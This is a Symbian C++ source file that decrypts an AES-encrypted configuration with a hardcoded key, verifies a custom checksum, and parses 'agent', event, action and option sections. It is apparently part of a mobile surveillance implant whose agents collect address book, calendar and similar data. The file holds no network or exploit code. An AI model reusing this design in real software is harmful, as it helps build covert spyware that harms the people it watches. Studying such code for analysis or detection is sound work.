#include "ConfigFile.h"
#include "Keys.h"
#include <S32FILE.H>
#include <s32mem.h> 	// RMemReadStream
#include <bautils.h>
#include <HT\FileUtils.h>
#include <HT\AES.h>
#include <HT\LogFile.h>

_LIT8(AGENT_CONF_DELIMITER, "AGENTCONFS-");
_LIT8(EVENT_CONF_DELIMITER, "EVENTCONFS-");
_LIT8(MOBIL_CONF_DELIMITER, "MOBILCONFS-");
_LIT8(ENDOF_CONF_DELIMITER, "ENDOFCONFS-");

/**
 * CActionData class holds the informations retrieved from the Config
 */
CDataAgent* CDataAgent::NewL(TAgentType aId, TAgentStatus aStatus, const TDesC8& buff)
	{
	CDataAgent* self = CDataAgent::NewLC(aId, aStatus, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataAgent* CDataAgent::NewLC(TAgentType aId, TAgentStatus aStatus, const TDesC8& buff)
	{
	CDataAgent* self = new (ELeave) CDataAgent(aId, aStatus);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataAgent::CDataAgent(TAgentType aId, TAgentStatus aStatus) :
	iId(aId), iStatus(aStatus)
	{
	}

CDataAgent::~CDataAgent()
	{
	iParams.Close();
	}

void CDataAgent::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

/**
 * CActionData class holds the informations retrieved from the Config
 */
CDataAction* CDataAction::NewL(TActionType aId, const TDesC8& buff)
	{
	CDataAction* self = CDataAction::NewLC(aId, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataAction* CDataAction::NewLC(TActionType aId, const TDesC8& buff)
	{
	CDataAction* self = new (ELeave) CDataAction(aId);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataAction::CDataAction(TActionType aId) :
	iId(aId)
	{
	}

CDataAction::~CDataAction()
	{
	iParams.Close();
	}

void CDataAction::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

/**
 * CDataMacroAction class holds the informations retrieved from the Config
 */
CDataMacroAction* CDataMacroAction::NewL()
	{
	CDataMacroAction* self = CDataMacroAction::NewLC();
	CleanupStack::Pop(); // self;
	return self;
	}

CDataMacroAction* CDataMacroAction::NewLC()
	{
	CDataMacroAction* self = new (ELeave) CDataMacroAction();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CDataMacroAction::~CDataMacroAction()
	{
	iActionsList.ResetAndDestroy();
	}

void CDataMacroAction::ConstructL()
	{
	}

void CDataMacroAction::AppendAction(CDataAction* aAction)
	{
	iActionsList.Append(aAction);
	}

/**
 * CDataAction class holds the informations retrieved from the Config
 */
CDataEvent* CDataEvent::NewL(TEventType aId, TUint32 aMacroIdx, const TDesC8& buff)
	{
	CDataEvent* self = CDataEvent::NewLC(aId, aMacroIdx, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataEvent* CDataEvent::NewLC(TEventType aId, TUint32 aMacroIdx, const TDesC8& buff)
	{
	CDataEvent* self = new (ELeave) CDataEvent(aId, aMacroIdx);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataEvent::CDataEvent(TEventType aId, TUint32 aMacroIdx) :
	iId(aId), iMacroActionIdx(aMacroIdx)
	{
	}

CDataEvent::~CDataEvent()
	{
	iParams.Close();
	}

void CDataEvent::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

/**
 * COptionsData class holds the informations retrieved from the Config
 */
CDataOption* CDataOption::NewL(TOptionType aId, const TDesC8& buff)
	{
	CDataOption* self = CDataOption::NewLC(aId, buff);
	CleanupStack::Pop(); // self;
	return self;
	}

CDataOption* CDataOption::NewLC(TOptionType aId, const TDesC8& buff)
	{
	CDataOption* self = new (ELeave) CDataOption(aId);
	CleanupStack::PushL(self);
	self->ConstructL(buff);
	return self;
	}

CDataOption::CDataOption(TOptionType aId) :
	iId(aId)
	{
	}

CDataOption::~CDataOption()
	{
	iParams.Close();
	}

void CDataOption::ConstructL(const TDesC8& buff)
	{
	iParams.Create(buff);
	}

CConfigFile::CConfigFile()
	{
	// No implementation required
	}

CConfigFile::~CConfigFile()
	{
	__FLOG(_L8("Destructor"));
	Clear();
	iMacroActionsList.Close();
	iAgentsList.Close();
	iEventsList.Close();
	iOptionsList.Close();
	__FLOG(_L8("End Destructor"));
	}

CConfigFile* CConfigFile::NewLC()
	{
	CConfigFile* self = new (ELeave) CConfigFile();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CConfigFile* CConfigFile::NewL()
	{
	CConfigFile* self = CConfigFile::NewLC();
	CleanupStack::Pop(); // self;
	return self;
	}

void CConfigFile::ConstructL()
	{
	__FLOG_OPEN("HT", "ConfigFile.txt");
	__FLOG(_L8("-------------"));
	}

void CConfigFile::Clear()
	{
	for (TInt i = 0; i < iMacroActionsList.Count(); i++)
		{
		iMacroActionsList[i]->iActionsList.ResetAndDestroy();
		}
	iMacroActionsList.ResetAndDestroy();
	iOptionsList.ResetAndDestroy();
	iEventsList.ResetAndDestroy();
	iAgentsList.ResetAndDestroy();
	}

TUint32 CConfigFile::ComputeCRC(const TDesC8& buff, TInt start, TInt len)
	{
	TInt32 conf_hash;
	TInt64 temp_hash = 0;
	
	for (TInt i = start; i < (len - start); i++)
		{
		temp_hash++;

		TInt8 b = buff[i];
		if (b != 0)
			temp_hash *= b;

		conf_hash = (TInt32) (temp_hash >> 32);
		temp_hash &= 0xFFFFFFFF;
		temp_hash ^= conf_hash;
		temp_hash &= 0xFFFFFFFF;
		 //__FLOG_3(_L8("TEMP_HASH: %Lu \t = \t %x"), temp_hash, temp_hash, temp_hash);
		}
	return (TUint32) temp_hash;
	} 

TUint32 CConfigFile::ComputeCRC(const TDesC8& buff)
	{
	return ComputeCRC(buff, 0, buff.Length());
	}

HBufC8* CConfigFile::DecryptConfigFileL(RFs& fs, const TDesC& fname)
	{
	//understand if this is a new conf, useful for LogInfo 
	TBool newConf = ETrue;
	if(fname.FindF(KTMP_CONFNAME) == KErrNotFound)
		{
		newConf = EFalse;
		}
	_LIT8(KInvalid,"Invalid new configuration, reverting");
	
	// Compute CRC Test Unit
	/*
	 TBuf8<100> buff;
	 buff.SetMax();
	 for (int i=0; i<buff.Length(); i++)
	 buff[i] = i+1;

	 // 0x0, 0x1, 0x4, 0xf, 0x40, 0x145, 0x7a4,	0x3583, 0x1ac20, 0xf0d29 
	 for (int i=0; i<10; i++)
	 {
	 TUint32 res = ComputeCRC(buff, 0, i);		
	 __FLOG_1(_L8("CRC2: %x"), res);
	 }

	 // 0x0, 0x9683a4, 0xfb58214c, 0x598075bf, 0x9d9667b9, 0x8ed1cd81, 0x7493338, 0x7f3e6d8f, 0xc318e3b3, 0x77617634
	 for (int i=0; i<10; i++)
	 {
	 TUint32 res = ComputeCRC(buff, 0, i*10);		
	 __FLOG_1(_L8("CRC3: %x"), res);
	 }
	 */

	// Convert key from string to hexa buffer
	TBuf8<16> hexaKey;
	for(TInt i = 0; i<32; i = i+2){
		TLex8 lex(KAES_CONFIG_KEY().Mid(i,2));
		TUint8 val;
		lex.Val(val,EHex);
		hexaKey.Append(val);
	}
				
	__FLOG(_L8("DecryptConfigFileL Begin"));
	if (!BaflUtils::FileExists(fs, fname))
		return HBufC8::NewL(0);

	
	HBufC8* buf = FileUtils::ReadFileContentsL(fs, fname);
	CleanupStack::PushL(buf);

	// Diff + AES[Len + Data + CRC]

	// removes Diff
	buf->Des().Delete(0, 8);

	__FLOG(_L8("AES::DecryptL() Begin"));
	RBuf8 plain(AES::DecryptL(buf->Des(), KIV, hexaKey));
	plain.CleanupClosePushL();
	__FLOG(_L8("AES::DecryptL() End"));

	if (plain.Length() == 0)
		{		
		CleanupStack::PopAndDestroy(&plain);
		CleanupStack::Pop(buf);
		buf->Des().SetLength(0);
		//write loginfo
		if(newConf)
			{
			LogInfoInvalidL(fs, KInvalid);
			}
		return buf;
		}

	TUint32 len = 0;
	Mem::Copy(&len, plain.Ptr(), 4);
	__FLOG_1(_L8("Len:%d"), len);

	// If these checks fails, it means that the file has not been decrypted correctly 
	//if (len <= 8 || len >= plain.MaxLength())
	if (len <= 8 || len > plain.MaxLength())
		{
		CleanupStack::PopAndDestroy(&plain);
		CleanupStack::Pop(buf);
		buf->Des().SetLength(0);
		//write loginfo
		if(newConf)
			{
			LogInfoInvalidL(fs, KInvalid);
			}
		return buf;
		}

	
	// Removes unneeded data from the end (AES padding)
	__FLOG_1(_L8("Len:%d"), plain.Length());
	plain.SetLength(len);

	// Retrieve the CRC
	// NOTE: Using the pointer the N96 will raise a Kern-Exec3 Panic, so we use the Mem::Copy API
	TUint32 fileCrc = 0;
	Mem::Copy(&fileCrc, plain.Right(4).Ptr(), 4);
	__FLOG_1(_L8("FileCrc:%d"), fileCrc);

	// Removes the CRC;
	plain.Delete(plain.Length() - 4, 4);

	// Computes the CRC and check if it is valid
	TUint32 compCrc = ComputeCRC(plain);
	TBool validCrc = (compCrc == fileCrc);
	
	if (validCrc)
		{
		// Removes Len from the beginning
		plain.Delete(0, 4);
		buf->Des().Copy(plain);
		}
	else
		{
		//write loginfo
		if(newConf)
			{
			LogInfoInvalidL(fs, KInvalid);
			}
				
		buf->Des().Zero();
		__FLOG_1(_L8("Comp CRC: %x"), compCrc);
		__FLOG_1(_L8("File CRC: %x"), fileCrc);
		}

	// ******* CRC Computation has been fixed.
	// ******* The code below can be removed.
	//plain.Delete(0, 4);
	//buf->Des().Copy(plain);
	// ******* 
	
	CleanupStack::PopAndDestroy(&plain);
	CleanupStack::Pop(buf);
	__FLOG(_L8("DecryptConfigFileL End"));
	return buf;
	}

TBool CConfigFile::LoadL(RFs& fs, const TDesC& filename)
	{
	__FLOG(_L8("LoadL"));
	RBuf8 configBuffer(DecryptConfigFileL(fs, filename));
	configBuffer.CleanupClosePushL();

	TBool isValid = (configBuffer.Length() > 0);
	if (isValid)
		{
		Clear();
		RMemReadStream memStream(configBuffer.Ptr(), configBuffer.Length());
		CleanupClosePushL(memStream);
		memStream >> *(this);
		CleanupStack::PopAndDestroy(&memStream);
		}

	CleanupStack::PopAndDestroy(&configBuffer);
	return isValid;
	}

void CConfigFile::ReadAgentSectionL(RReadStream& aStream)
	{
	iAgentsList.ResetAndDestroy();

	TUint32 numAgents = 0;
	aStream >> numAgents;
	// 14 Agenti ???
	for (int i = 0; i < numAgents; i++)
		{
		TUint32 agentId = 0;
		TUint32 agentStatus = 0;
		TUint32 paramLen = 0;
		aStream >> agentId;
		aStream >> agentStatus; //	1=NotActive  2=Active
		aStream >> paramLen;

		RBuf8 params;
		params.Create(paramLen);
		params.CleanupClosePushL();
		aStream.ReadL(params);

		// MARK: Begin AGENT_TASKS Patch
		// The patch below is needed because the Config file doesn't take in 
		// consideration AddressBook and Calendar Agents yet, but only the Tasks Agent
		// So, when there is a reference to Tasks Agent in the Config, we will start both
		// the AddressBook and the Calendar Agents.
		if (agentId == EAgent_Tasks_TODO)
			{
			CDataAgent* newAgent = CDataAgent::NewL(EAgent_Addressbook, (TAgentStatus) agentStatus, params);
			iAgentsList.Append(newAgent);
			agentId = EAgent_Calendar;
			}
		// End AGENT_TASKS Patch

		// Add Agent to the List
		// and transfer the ownership		
		CDataAgent* newAgent = CDataAgent::NewL((TAgentType) agentId, (TAgentStatus) agentStatus, params);
		iAgentsList.Append(newAgent);

		CleanupStack::PopAndDestroy(&params);
		}
	}

void CConfigFile::ReadEventSectionL(RReadStream& aStream)
	{
	iEventsList.ResetAndDestroy();

	TUint32 numEvents = 0;
	aStream >> numEvents;

	for (int i = 0; i < numEvents; i++)
		{
		TUint32 eventId = 0;
		TUint32 macroActionIdx = 0;
		TUint32 paramLen = 0;
		aStream >> eventId; 
		aStream >> macroActionIdx;
		aStream >> paramLen;

		RBuf8 params;
		params.Create(paramLen);
		params.CleanupClosePushL();
		aStream.ReadL(params);

		// Add Event to the List
		// and transfer the ownership.
		CDataEvent* newEvent = CDataEvent::NewL((TEventType) eventId, macroActionIdx, params);
		iEventsList.Append(newEvent);

		CleanupStack::PopAndDestroy(&params);
		}

	iMacroActionsList.ResetAndDestroy();
	TUint32 numActions = 0;
	aStream >> numActions;
	// Puo' contenere piu' Azioni degli eventi perche' una Azione puo' anche non essere associata a nessun evento.
	for (int i = 0; i < numActions; i++)
		{
		TUint32 numSub = 0;
		aStream >> numSub; //**
		CDataMacroAction* newMacroAction = CDataMacroAction::NewL();
		iMacroActionsList.Append(newMacroAction);

		for (int j = 0; j < numSub; j++)
			{
			TUint32 actionId = 0;
			TUint32 paramLen = 0;
			aStream >> actionId; //**
			aStream >> paramLen; //**
			RBuf8 params;
			params.Create(paramLen);
			params.CleanupClosePushL();
			aStream.ReadL(params); //**

			CDataAction* newAction = CDataAction::NewL((TActionType) actionId, params);
			newMacroAction->AppendAction(newAction);
			CleanupStack::PopAndDestroy(&params);
			}
		}
	}

void CConfigFile::ReadMobilSectionL(RReadStream& aStream)
	{
	iOptionsList.ResetAndDestroy();

	TUint32 numConf = 0;
	aStream >> numConf;
	for (int i = 0; i < numConf; i++)
		{
		TUint32 optId = 0;
		TUint32 paramLen = 0;
		aStream >> optId; // 0x8001
		aStream >> paramLen;

		RBuf8 params;
		params.Create(paramLen);
		params.CleanupClosePushL();
		aStream.ReadL(params);

		// Add the Option to the list 
		// and transfer the ownership.
		CDataOption* newOption = CDataOption::NewL((TOptionType) optId, params);
		iOptionsList.Append(newOption);

		CleanupStack::PopAndDestroy(&params);
		}
	}

void CConfigFile::InternalizeL(RReadStream& aStream)
	{
	__FLOG(_L8("InternalizeL"));
	TBuf8<20> delimBuff;

	delimBuff.SetLength(ENDOF_CONF_DELIMITER().Length());
	aStream.ReadL((TUint8 *) delimBuff.Ptr(), ENDOF_CONF_DELIMITER().Length());

	while (delimBuff != ENDOF_CONF_DELIMITER())
		{
		// skips the 0x00 which belogs to the delimiter
		aStream.ReadL(1);
		if (delimBuff == AGENT_CONF_DELIMITER())
			{
			ReadAgentSectionL(aStream);
			}
		if (delimBuff == EVENT_CONF_DELIMITER())
			{
			ReadEventSectionL(aStream);
			}
		if (delimBuff == MOBIL_CONF_DELIMITER())
			{
			ReadMobilSectionL(aStream);
			}
		aStream.ReadL((TUint8 *) delimBuff.Ptr(), delimBuff.Length());
		}

#ifdef _LOGGING
	__FLOG(_L8("Config Loaded!"));

	__FLOG(_L8("*** AGENTS:"));
	for (int i = 0; i < iAgentsList.Count(); i++)
		{
		CDataAgent* agent = iAgentsList[i];
		__FLOG_2(_L8("Id: %x	Status: %d"), agent->iId, agent->iStatus);
		}

	__FLOG(_L8("*** MACRO ACTIONS:"));
	for (int i = 0; i < iMacroActionsList.Count(); i++)
		{
		CDataMacroAction* macro = iMacroActionsList[i];
		__FLOG_2(_L8("Macro Indx: %d   ActionsCount:%d"), i, macro->iActionsList.Count());
		for (int j = 0; j < macro->iActionsList.Count(); j++)
			{
			CDataAction* action = macro->iActionsList[j];
			__FLOG_1(_L8("\tId: %x"), action->iId);
			}
		}

	__FLOG(_L8("*** EVENTS:"));
	for (int i = 0; i < iEventsList.Count(); i++)
		{
		CDataEvent* event = iEventsList[i];
		CDataMacroAction* macro = iMacroActionsList[event->iMacroActionIdx];
		__FLOG_2(_L8("Id: %x	ActionsCount: %d"), event->iId, macro->iActionsList.Count());
		for (int j = 0; j < macro->iActionsList.Count(); j++)
			{
			CDataAction* action = macro->iActionsList[j];
			__FLOG_1(_L8("\tId: %x"), action->iId);
			}
		}

	__FLOG(_L8("*** OPTIONS:"));
	for (int i = 0; i < iOptionsList.Count(); i++)
		{
		CDataOption* option = iOptionsList[i];
		__FLOG_1(_L8("\tId: %x"), option->iId);
		}
#endif

	__FLOG(_L8("End InternalizeL"));
	}

CDataAgent* CConfigFile::FindDataAgent(TAgentType aAgentId)
	{
	for (int i = 0; i < iAgentsList.Count(); i++)
		if (aAgentId == iAgentsList[i]->iId)
			return iAgentsList[i];
	return NULL;
	}

void CConfigFile::LogInfoInvalidL(RFs& aFs, const TDesC8& aLogMsg)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	buffer->InsertL(buffer->Size(),(TUint8*)aLogMsg.Ptr(),aLogMsg.Size());
	HBufC8* byteBuf = buffer->Ptr(0).AllocLC();
	CLogFile* logFile = CLogFile::NewLC(aFs);
	logFile->CreateLogL(LOGTYPE_INFO);
	logFile->AppendLogL(*byteBuf);
	logFile->CloseLogL();
	CleanupStack::PopAndDestroy(logFile);
	CleanupStack::PopAndDestroy(byteBuf);
	CleanupStack::PopAndDestroy(buffer);
	}
